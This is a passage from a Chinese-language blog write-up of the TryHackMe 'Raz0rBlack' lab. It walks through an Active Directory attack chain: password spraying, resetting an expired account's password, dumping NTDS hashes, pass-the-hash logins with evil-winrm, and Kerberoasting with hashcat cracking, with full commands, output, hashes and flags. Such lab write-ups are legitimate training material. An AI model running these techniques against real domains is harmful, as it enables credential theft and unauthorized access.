class="hljs-variable">$smbmap</span> -H 10.10.104.184 -u twilliams -p roastpotatoes<br>[+] IP: 10.10.104.184:445Name: 10.10.104.184                                      <br>        Disk                                                  PermissionsComment<br>----                                                  ------------------<br>ADMIN$                                            NO ACCESSRemote Admin<br>C$                                                NO ACCESSDefault share<br>IPC$                                              READ ONLYRemote IPC<br>NETLOGON                                          READ ONLYLogon server share <br>SYSVOL                                            READ ONLYLogon server share <br>trash                                             NO ACCESSFiles Pending <span class="hljs-keyword">for</span> deletio<br></code></pre></td></tr></table></figure><p>看起来没什么东西，可以尝试走rpcclient获取更多用户名，不过也没有更多：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$rpcclient</span> -U twilliams 10.10.104.184 -c <span class="hljs-string">&#x27;enumdomusers&#x27;</span> &gt; user.txt<br><span class="hljs-variable">$cat</span> user.txt | grep user | awk -F <span class="hljs-string">&#x27;[&#x27;</span> <span class="hljs-string">&#x27;&#123;print $2&#125;&#x27;</span>| awk -F <span class="hljs-string">&#x27;]&#x27;</span> <span class="hljs-string">&#x27;&#123;print $1&#125;&#x27;</span> &gt; users.txt<br><span class="hljs-variable">$cat</span> users.txt <br>Administrator<br>Guest<br>krbtgt<br>xyan1d3<br>lvetrova<br>sbradley<br>twilliams<br></code></pre></td></tr></table></figure><p>SMB中没有什么有用的东西，那么现在其实试试bloodhound去枚举LDAP：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$bloodhound</span>-python -u twilliams -p roastpotatoes -d raz0rblack.thm -ns 10.10.104.184 --zip -c All<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220626050219563.png" alt="image-20220626050219563"></p><p>信息太少，winrm被禁止远程登录,而445因为没有权限访问命名管道失败也理所应当：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$psexec</span>.py twilliams@10.10.104.184<br>Impacket v0.10.1.dev1+20220606.123812.ac35841f - Copyright 2022 SecureAuth Corporation<br><br>Password:<br>[*] Requesting shares on 10.10.104.184.....<br>[-] share <span class="hljs-string">&#x27;ADMIN$&#x27;</span> is not writable.<br>[-] share <span class="hljs-string">&#x27;C$&#x27;</span> is not writable.<br>[-] share <span class="hljs-string">&#x27;NETLOGON&#x27;</span> is not writable.<br>[-] share <span class="hljs-string">&#x27;SYSVOL&#x27;</span> is not writable.<br>[-] share <span class="hljs-string">&#x27;trash&#x27;</span> is not writable.<br></code></pre></td></tr></table></figure><p>那我现在一堆用户名一个密码，尝试密码喷涂吧。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$crackmapexec</span> smb 10.10.104.184 -u users.txt -p passwd --continue-on-success<br>/usr/lib/python3/dist-packages/paramiko/transport.py:219: CryptographyDeprecationWarning: Blowfish has been deprecated<br>  <span class="hljs-string">&quot;class&quot;</span>: algorithms.Blowfish,<br>SMB         10.10.104.184     445    HAVEN-DC         [*] Windows 10.0 Build 17763 x64 (name:HAVEN-DC) (domain:raz0rblack.thm) (signing:True) (SMBv1:False)<br>SMB         10.10.104.184     445    HAVEN-DC         [-] raz0rblack.thm\Administrator:roastpotatoes STATUS_LOGON_FAILURE <br>SMB         10.10.104.184     445    HAVEN-DC         [-] raz0rblack.thm\Guest:roastpotatoes STATUS_LOGON_FAILURE <br>SMB         10.10.104.184     445    HAVEN-DC         [-] raz0rblack.thm\krbtgt:roastpotatoes STATUS_LOGON_FAILURE <br>SMB         10.10.104.184     445    HAVEN-DC         [-] raz0rblack.thm\xyan1d3:roastpotatoes STATUS_LOGON_FAILURE <br>SMB         10.10.104.184     445    HAVEN-DC         [-] raz0rblack.thm\lvetrova:roastpotatoes STATUS_LOGON_FAILURE <br>SMB         10.10.104.184     445    HAVEN-DC         [-] raz0rblack.thm\sbradley:roastpotatoes STATUS_PASSWORD_MUST_CHANGE <br>SMB         10.10.104.184     445    HAVEN-DC         [+] raz0rblack.thm\twilliams:roastpotatoes<br></code></pre></td></tr></table></figure><p>sbradley用户的提示信息不一样，说必须更改密码。或许是密码已过期？可以尝试更改,为了省事，我还是将其设置为了roastpotatoes：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$smbpasswd</span> -r 10.10.104.184 -U sbradley<br>Old SMB password:roastpotatoes<br>New SMB password:roastpotatoes<br>Retype new SMB password:roastpotatoes<br>Password changed <span class="hljs-keyword">for</span> user sbradley<br><br><span class="hljs-variable">$smbmap</span> -H 10.10.104.184 -u sbradley -p roastpotatoes<br>[+] IP: 10.10.104.184:445Name: 10.10.104.184                                       <br>        Disk                                                  PermissionsComment<br>----                                                  ------------------<br>ADMIN$                                            NO ACCESSRemote Admin<br>C$                                                NO ACCESSDefault share<br>IPC$                                              READ ONLYRemote IPC<br>NETLOGON                                          READ ONLYLogon server share <br>SYSVOL                                            READ ONLYLogon server share <br>trash                                             READ ONLYFiles Pending <span class="hljs-keyword">for</span> deletion<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$smbclient</span> //10.10.104.184/trash -U sbradley<br>Enter WORKGROUP\sbradley<span class="hljs-string">&#x27;s password: </span><br><span class="hljs-string">Try &quot;help&quot; to get a list of possible commands.</span><br><span class="hljs-string">smb: \&gt; ls</span><br><span class="hljs-string">  .                                   D        0  Tue Mar 16 14:01:28 2021</span><br><span class="hljs-string">  ..                                  D        0  Tue Mar 16 14:01:28 2021</span><br><span class="hljs-string">  chat_log_20210222143423.txt         A     1340  Fri Feb 26 03:29:05 2021</span><br><span class="hljs-string">  experiment_gone_wrong.zip           A 18927164  Tue Mar 16 14:02:20 2021</span><br><span class="hljs-string">  sbradley.txt                        A       37  Sun Feb 28 03:24:21 2021</span><br><span class="hljs-string">  </span><br><span class="hljs-string">smb: \&gt; mget *</span><br></code></pre></td></tr></table></figure><p>解压文件需要密码：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$zip2john</span> experiment_gone_wrong.zip &gt; hash.txt<br><span class="hljs-variable">$john</span> hash.txt -w=/usr/share/wordlists/rockyou.txt<br>Using default input encoding: UTF-8<br>Loaded 1 password <span class="hljs-built_in">hash</span> (PKZIP [32/64])<br>Will run 2 OpenMP threads<br>Press <span class="hljs-string">&#x27;q&#x27;</span> or Ctrl-C to abort, almost any other key <span class="hljs-keyword">for</span> status<br>electromagnetismo (experiment_gone_wrong.zip)<br>1g 0:00:00:06 DONE (2022-06-25 22:33) 0.1545g/s 1294Kp/s 1294Kc/s 1294KC/s elephantman31..eldon1986<br>Use the <span class="hljs-string">&quot;--show&quot;</span> option to display all of the cracked passwords reliably<br>Session completed. <br><br><span class="hljs-variable">$unzip</span> experiment_gone_wrong.zip <br>Archive:  experiment_gone_wrong.zip<br>[experiment_gone_wrong.zip] system.hive password: <br>  inflating: system.hive             <br>  inflating: ntds.dit<br>  <br><span class="hljs-variable">$secretsdump</span>.py -ntds ./ntds.dit -system ./system.hive LOCAL &gt; user.hash<br><span class="hljs-variable">$cat</span> user.hash<br><br>[*] Target system bootKey: 0x17a0a12951d502bb3c14cf1d495a71ad<br>[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)<br>[*] Searching <span class="hljs-keyword">for</span> pekList, be patient<br>[*] PEK <span class="hljs-comment"># 0 found and decrypted: 84bf0a79cd645db4f94b24c35cfdf7c7</span><br>[*] Reading and decrypting hashes from ./ntds.dit <br>Administrator:500:aad3b435b51404eeaad3b435b51404ee:1afedc472d0fdfe07cd075d36804efd0:::<br>Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br>HAVEN-DC$:1000:aad3b435b51404eeaad3b435b51404ee:4ea59b8f64c94ec66ddcfc4e6e5899f9:::<br>krbtgt:502:aad3b435b51404eeaad3b435b51404ee:703a365974d7c3eeb80e11dd27fb0cb3:::<br>&lt;skip&gt;<br></code></pre></td></tr></table></figure><p>但管理员的并不能被用来进行登录。对哈希稍加处理进行密码喷涂：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">crackmapexec smb 10.10.104.184 -u users.txt -H user.hash <br>SMB         10.10.104.184   445    HAVEN-DC         [-] raz0rblack.thm\Administrator:f220d3988deb3f516c73f40ee16c431d STATUS_LOGON_FAILURE <br>SMB         10.10.104.184   445    HAVEN-DC         [-] raz0rblack.thm\Guest:f220d3988deb3f516c73f40ee16c431d STATUS_LOGON_FAILURE <br>SMB         10.10.104.184   445    HAVEN-DC         [-] raz0rblack.thm\krbtgt:f220d3988deb3f516c73f40ee16c431d STATUS_LOGON_FAILURE <br>SMB         10.10.104.184   445    HAVEN-DC         [-] raz0rblack.thm\xyan1d3:f220d3988deb3f516c73f40ee16c431d STATUS_LOGON_FAILURE <br>SMB         10.10.104.184   445    HAVEN-DC         [+] raz0rblack.thm\lvetrova f220d3988deb3f516c73f40ee16c431d <br></code></pre></td></tr></table></figure><p>可以看到有一条是成功了的。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$evil</span>-winrm -i 10.10.104.184 -u lvetrova -H f220d3988deb3f516c73f40ee16c431d<br><br>Evil-WinRM shell v3.4<br><br>Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() <span class="hljs-keyword">function</span> is unimplemented on this machine<br><br>Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm<span class="hljs-comment">#Remote-path-completion</span><br><br>Info: Establishing connection to remote endpoint<br><br><br>*Evil-WinRM* PS C:\Users\lvetrova\Documents&gt;<br></code></pre></td></tr></table></figure><p>目录下边有一个xml文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">*Evil-WinRM* PS C:\<span class="hljs-built_in">users</span>\lvetrova&gt; <span class="hljs-built_in">ls</span><br><br><br>    Directory: C:\<span class="hljs-built_in">users</span>\lvetrova<br><br><br>Mode                LastWriteTime         Length Name<br>----                -------------         ------ ----<br>d-r---        9/15/2018  12:19 AM                Desktop<br>d-r---        2/25/2021  10:14 AM                Documents<br>d-r---        9/15/2018  12:19 AM                Downloads<br>d-r---        9/15/2018  12:19 AM                Favorites<br>d-r---        9/15/2018  12:19 AM                Links<br>d-r---        9/15/2018  12:19 AM                Music<br>d-r---        9/15/2018  12:19 AM                Pictures<br>d-----        9/15/2018  12:19 AM                Saved Games<br>d-r---        9/15/2018  12:19 AM                Videos<br>-a----        2/25/2021  10:16 AM           1692 lvetrova.xml<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs bash">*Evil-WinRM* PS C:\<span class="hljs-built_in">users</span>\lvetrova&gt; <span class="hljs-built_in">cat</span> lvetrova.xml<br>&lt;Objs Version=<span class="hljs-string">&quot;1.1.0.1&quot;</span> xmlns=<span class="hljs-string">&quot;http://schemas.microsoft.com/powershell/2004/04&quot;</span>&gt;<br>  &lt;Obj RefId=<span class="hljs-string">&quot;0&quot;</span>&gt;<br>    &lt;TN RefId=<span class="hljs-string">&quot;0&quot;</span>&gt;<br>      &lt;T&gt;System.Management.Automation.PSCredential&lt;/T&gt;<br>      &lt;T&gt;System.Object&lt;/T&gt;<br>    &lt;/TN&gt;<br>    &lt;ToString&gt;System.Management.Automation.PSCredential&lt;/ToString&gt;<br>    &lt;Props&gt;<br>      &lt;S N=<span class="hljs-string">&quot;UserName&quot;</span>&gt;Your Flag is here =&amp;gt;&lt;/S&gt;<br>      &lt;SS N=<span class="hljs-string">&quot;Password&quot;</span>&gt;01000000d08c9ddf0115d1118c7a00c04fc297eb010000009db56a0543f441469fc81aadb02945d20000000002000000000003660000c000000010000000069a026f82c590fa867556fe4495ca870000000004800000a0000000100000003b5bf64299ad06afde3fc9d6efe72d35500000002828ad79f53f3f38ceb3d8a8c41179a54dc94cab7b17ba52d0b9fc62dfd4a205f2bba2688e8e67e5cbc6d6584496d107b4307469b95eb3fdfd855abe27334a5fe32a8b35a3a0b6424081e14dc387902414000000e6e36273726b3c093bbbb4e976392a874772576d&lt;/SS&gt;<br>    &lt;/Props&gt;<br>  &lt;/Obj&gt;<br>&lt;/Objs&gt;<br>*Evil-WinRM* PS C:\<span class="hljs-built_in">users</span>\lvetrova&gt; <span class="hljs-variable">$cred</span> = Import-CliXml -Path lvetrova.xml<br>*Evil-WinRM* PS C:\<span class="hljs-built_in">users</span>\lvetrova&gt; <span class="hljs-variable">$cred</span>.GetNetworkCredential() | Format-List *<br><br><br>UserName       : Your Flag is here =&gt;<br>Password       : THM&#123;694...................................&#125;<br>SecurePassword : System.Security.SecureString<br>Domain         :<br><br><br><br>*Evil-WinRM* PS C:\<span class="hljs-built_in">users</span>\lvetrova&gt; <br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$bloodhound</span>-python -u lvetrova --hashes f220d3988deb3f516c73f40ee16c431d:f220d3988deb3f516c73f40ee16c431d -d raz0rblack.thm -ns 10.10.104.184 --zip -c All<br>INFO: Found AD domain: raz0rblack.thm<br>INFO: Connecting to LDAP server: haven-dc.raz0rblack.thm<br>INFO: Found 1 domains<br>INFO: Found 1 domains <span class="hljs-keyword">in</span> the forest<br>INFO: Found 1 computers<br>INFO: Connecting to LDAP server: haven-dc.raz0rblack.thm<br>INFO: Found 8 <span class="hljs-built_in">users</span><br>INFO: Found 52 <span class="hljs-built_in">groups</span><br>INFO: Found 0 trusts<br>INFO: Starting computer enumeration with 10 workers<br>INFO: Querying computer: HAVEN-DC.raz0rblack.thm<br>INFO: Done <span class="hljs-keyword">in</span> 01M 05S<br>INFO: Compressing output into 20220626134344_bloodhound.zip<br></code></pre></td></tr></table></figure><p>没什么新东西。看一下另一个神秘的用户：</p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220626135400440.png" alt="image-20220626135400440"></p><p>备份组的成员。当前情况如果我想得到这个用户，要么找系统漏洞，要么找委派账户或者域内服务账号。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">*Evil-WinRM* PS C:\<span class="hljs-built_in">users</span>\lvetrova&gt; net user<br><br>User accounts <span class="hljs-keyword">for</span> \\<br><br>-------------------------------------------------------------------------------<br>Administrator            Guest                    krbtgt<br>lvetrova                 sbradley                 twilliams<br>xyan1d3<br>The <span class="hljs-built_in">command</span> completed with one or more errors.<br><br>*Evil-WinRM* PS C:\<span class="hljs-built_in">users</span>\lvetrova&gt; <br></code></pre></td></tr></table></figure><p>没有服务账户。</p><h4 id="Kerberoasting："><a href="#Kerberoasting：" class="headerlink" title="Kerberoasting："></a>Kerberoasting：</h4><p>其实可以用当前用户去申请一下ST票据，看能否获取一下设置了SPN账户的票据：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$GetUserSPNs</span>.py raz0rblack.thm/lvetrova -hashes f220d3988deb3f516c73f40ee16c431d:f220d3988deb3f516c73f40ee16c431d -outputfile kerberoastables.txt -dc-ip 10.10.104.184<br>Impacket v0.10.1.dev1+20220606.123812.ac35841f - Copyright 2022 SecureAuth Corporation<br><br>ServicePrincipalName                   Name     MemberOf                                                    PasswordLastSet             LastLogon  Delegation <br>-------------------------------------  -------  ----------------------------------------------------------  --------------------------  ---------  ----------<br>HAVEN-DC/xyan1d3.raz0rblack.thm:60111  xyan1d3  CN=Remote Management Users,CN=Builtin,DC=raz0rblack,DC=thm  2021-02-23 23:17:17.715160  &lt;never&gt;   <br><br><span class="hljs-variable">$cat</span> kerberoastables.txt <br>$krb5tgs$23$*xyan1d3<span class="hljs-variable">$RAZ0RBLACK</span>.THM<span class="hljs-variable">$raz0rblack</span>.thm/xyan1d3*$1a5564b34ebfedb209a82d03599d840a<span class="hljs-variable">$99e949327fb5de82e27af6f471ca7d895f9f34c0db59cf13af8472194222833bfb33f9926e35c8f37d99f5252be57db29e34ec7a0e5295a524c4f187cc335c1c68bd330f71217bd1ff7e439fadd5e3a2d49fc348c43077b9572efd075cf22ea7266ef732cbe6566a1ee6130352b2e59fa19769a6a321ecce292daa5af5d9b4892adc6d0271be9d4f0ed6d69b49767c27cafdfb2a9055edbf8412e36b81f38f33aaa07d4fe61129469aa1e0e8a4744e005db57b105531456558070a64b951cf9c0bbb1aac6edfdcacb91846ad4df7ee71930766fdacc6aab7348d646463d6e6ad27ec5cbb6877d3cee5b36ea5eefd771408a777a855357a4b01a50bd92858e1515d09edcea4ce8c71b6091a771a8e916221c695800e6734d73f9a7a6baab6f353e83cbd5d2830318701c250eeb364839203c9517f535bcb82edc0fd621c39a09fd44c09a690f8d2eb2fa2e0ab111dab0c954401f8f96a1f798b499e87c0c09857e55eaead855cd294544499fde649de2415fbbe1415d8d9cdfab57dc45c8666d10c8967423a85ea11a6dcee4a2f8097d1be9eaf2a9d25807ff5c4bf21fe4609897edde76ddf65c457081ddb4489404ab80219d3612880e670cdce4bced224dd5d5389f88907fbe3559b2769a950ee0390f91013f0a4e18c9a51b6db65e53b54c9c48eac6acc496419d63a7e76bd9e2b9098c1a3504633c581513ab94b913f970930721fd692f469e8737ff0956f6b05b05e550e77442e1923a146503da12815c2b5e8c938b96908dc54c0c00b88ec9295c5bbb0edb85f8af575a96029b18f3ba02bddc8202df3ec609c6f80247942a9dc88874ea2b09ee904170b3e9b51e4158d075070951d56413bd9711fa91c0f032949e1ce8055e33b2f1062d2e8b25dbe736b054ebdafec3bb4c37b4f53269ac971fd658c8740c4fe63b021f61516bc2150222acbdb94fe4f1e7701c754d3f9a559445719a97ffe29192e0a725b37df51dae5f8139ff2832d2de4949f4c799de8b0fe3db1c92a730db4f14629d04867c7663d3745dc2f6cb4b8b0ff329d53b5f4c834b66231c67528c63d57e41a486c1337a3a5be3c5e0936c7a1ec3e62b51761bb1ab089074b4cf90dcf2f7f6af2435826bedf8d3c09a29cdc89bc7188618aa76a4374049aadc17b7539c827aae0b08c6a34bf0d1c10bcb6c90bb0721aab016529b4840d526832a8e52829f03a391111795155a7c5c74b504e636f4ebf40364f00271e3dfbe46ed1a06f9555f0b727903467a50a221de45067e7b68ba7031a136d51983bd4c21f7d74c261174e67861751af3c7f97bb5c98930e93517f19652f500dba625b511f9dd2b203092af4e843473111120917e0003c8db0ab584e58a6f3f8db2bef136c67bab029a44102f6513c41c90db009d903d3934af6877fc238</span><br><br><span class="hljs-variable">$hashcat</span> -m 13100 kerberoastables.txt /usr/share/wordlists/rockyou.txt<br>Dictionary cache hit:<br>* Filename..: /usr/share/wordlists/rockyou.txt<br>* Passwords.: 14344385<br>* Bytes.....: 139921507<br>* Keyspace..: 14344385<br><br>$krb5tgs$23$*xyan1d3<span class="hljs-variable">$RAZ0RBLACK</span>.THM<span class="hljs-variable">$raz0rblack</span>.thm/xyan1d3*$1a5564b34ebfedb209a82d03599d840a<span class="hljs-variable">$99e949327fb5de82e27af6f471ca7d895f9f34c0db59cf13af8472194222833bfb33f9926e35c8f37d99f5252be57db29e34ec7a0e5295a524c4f187cc335c1c68bd330f71217bd1ff7e439fadd5e3a2d49fc348c43077b9572efd075cf22ea7266ef732cbe6566a1ee6130352b2e59fa19769a6a321ecce292daa5af5d9b4892adc6d0271be9d4f0ed6d69b49767c27cafdfb2a9055edbf8412e36b81f38f33aaa07d4fe61129469aa1e0e8a4744e005db57b105531456558070a64b951cf9c0bbb1aac6edfdcacb91846ad4df7ee71930766fdacc6aab7348d646463d6e6ad27ec5cbb6877d3cee5b36ea5eefd771408a777a855357a4b01a50bd92858e1515d09edcea4ce8c71b6091a771a8e916221c695800e6734d73f9a7a6baab6f353e83cbd5d2830318701c250eeb364839203c9517f535bcb82edc0fd621c39a09fd44c09a690f8d2eb2fa2e0ab111dab0c954401f8f96a1f798b499e87c0c09857e55eaead855cd294544499fde649de2415fbbe1415d8d9cdfab57dc45c8666d10c8967423a85ea11a6dcee4a2f8097d1be9eaf2a9d25807ff5c4bf21fe4609897edde76ddf65c457081ddb4489404ab80219d3612880e670cdce4bced224dd5d5389f88907fbe3559b2769a950ee0390f91013f0a4e18c9a51b6db65e53b54c9c48eac6acc496419d63a7e76bd9e2b9098c1a3504633c581513ab94b913f970930721fd692f469e8737ff0956f6b05b05e550e77442e1923a146503da12815c2b5e8c938b96908dc54c0c00b88ec9295c5bbb0edb85f8af575a96029b18f3ba02bddc8202df3ec609c6f80247942a9dc88874ea2b09ee904170b3e9b51e4158d075070951d56413bd9711fa91c0f032949e1ce8055e33b2f1062d2e8b25dbe736b054ebdafec3bb4c37b4f53269ac971fd658c8740c4fe63b021f61516bc2150222acbdb94fe4f1e7701c754d3f9a559445719a97ffe29192e0a725b37df51dae5f8139ff2832d2de4949f4c799de8b0fe3db1c92a730db4f14629d04867c7663d3745dc2f6cb4b8b0ff329d53b5f4c834b66231c67528c63d57e41a486c1337a3a5be3c5e0936c7a1ec3e62b51761bb1ab089074b4cf90dcf2f7f6af2435826bedf8d3c09a29cdc89bc7188618aa76a4374049aadc17b7539c827aae0b08c6a34bf0d1c10bcb6c90bb0721aab016529b4840d526832a8e52829f03a391111795155a7c5c74b504e636f4ebf40364f00271e3dfbe46ed1a06f9555f0b727903467a50a221de45067e7b68ba7031a136d51983bd4c21f7d74c261174e67861751af3c7f97bb5c98930e93517f19652f500dba625b511f9dd2b203092af4e843473111120917e0003c8db0ab584e58a6f3f8db2bef136c67bab029a44102f6513c41c90db009d903d3934af6877fc238</span>:cyanide9amine5628<br></code></pre></td></tr></table></figure><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">xya<span class="hljs-symbol">n1</span>d<span class="hljs-number">3</span>:cya<span class="hljs-symbol">nide9</span>ami<span class="hljs-symbol">ne5628</span><br></code></pre></td></tr></table></figure><p>它是远程管理组，可以直接走winrm登录:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$evil</span>-winrm -i 10.10.104.184 -u xyan1d3 -p cyanide9amine5628<br><br>Evil-WinRM shell v3.4<br><br>Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() <span class="hljs-keyword">function</span> is unimplemented on this machine<br><br>Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm<span class="hljs-comment">#Remote-path-completion</span><br><br>Info: Establishing connection to remote endpoint<br><br>*Evil-WinRM* PS C:\Users\xyan1d3\Documents&gt; <span class="hljs-built_in">ls</span><br>*Evil-WinRM* PS C:\Users\xyan1d3\Documents&gt; <span class="hljs-built_in">cd</span> ..<br>*Evil-WinRM* PS C:\Users\xyan1d3&gt; <span class="hljs-built_in">ls</span><br><br><br>    Directory: C:\Users\xyan1d3<br><br><br>Mode                LastWriteTime         Length Name<br>----                -------------         ------ ----<br>d-r---        9/15/2018  12:19 AM                Desktop<br>d-r---        2/25/2021   9:34 AM                Documents<br>d-r---        9/15/2018  12:19 AM                Downloads<br>d-r---        9/15/2018  12:19 AM                Favorites<br>d-r---        9/15/2018  12:19 AM                Links<br>d-r---        9/15/2018  12:19 AM                Music<br>d-r---        9/15/2018  12:19 AM                Pictures<br>d-----        9/15/2018  12:19 AM                Saved Games<br>d-r---        9/15/2018  12:19 AM                Videos<br>-a----        2/25/2021   9:33 AM           1826 xyan1d3.xml<br><br><br>*Evil-WinRM* PS C:\Users\xyan1d3&gt; <span class="hljs-variable">$cred</span> = Import-CliXml -Path xyan1d3.xml<br>*Evil-WinRM* PS C:\Users\xyan1d3&gt; <span class="hljs-variable">$cred</span>.GetNetworkCredential() | Format-List *<br><br><br>UserName       : Nope your flag is not here<br>Password       : LOL here it is -&gt; THM&#123;62ca7e0b901aa8f0b233cade0839b5bb&#125;<br>SecurePassword : System.Security.SecureString<br>Domain         :<br><br><br><br>*Evil-WinRM* PS C:\Users\xyan1d3&gt; <br></code></pre></td></tr></table></figure><h4 id="渗出："><a href="#渗出：" class="headerlink" 